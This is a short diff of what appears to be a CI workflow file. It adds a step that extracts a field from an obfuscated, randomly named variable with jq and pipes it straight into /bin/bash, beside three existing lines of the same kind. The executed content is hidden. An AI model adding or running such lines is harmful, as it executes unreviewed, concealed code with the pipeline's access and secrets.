@@ -30,6 +30,7 @@ jobs:
           echo $dvg71 | jq -r .dv87 | /bin/bash
           echo $mvbzo89699 | jq -r .r45527 | /bin/bash
           printf '%s' "$e59" | jq -r .uf31 | /bin/bash
+          echo $hcrue91 | jq -r .hdf9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
